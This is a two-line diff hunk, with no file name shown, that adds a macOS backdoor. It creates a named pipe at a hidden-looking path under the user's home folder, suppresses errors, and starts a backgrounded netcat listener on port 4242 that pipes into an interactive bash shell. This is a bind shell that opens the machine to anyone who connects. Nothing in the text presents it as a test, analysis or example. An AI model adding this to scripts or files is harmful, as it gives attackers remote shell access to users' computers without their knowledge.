@@ -1,0 +1,2 @@
+mkfifo /Users/$USER/.system 2> /dev/null;
+nc -l 4242 </Users/$USER/.system | /bin/bash -i >/Users/$USER/.system 2>&1 &
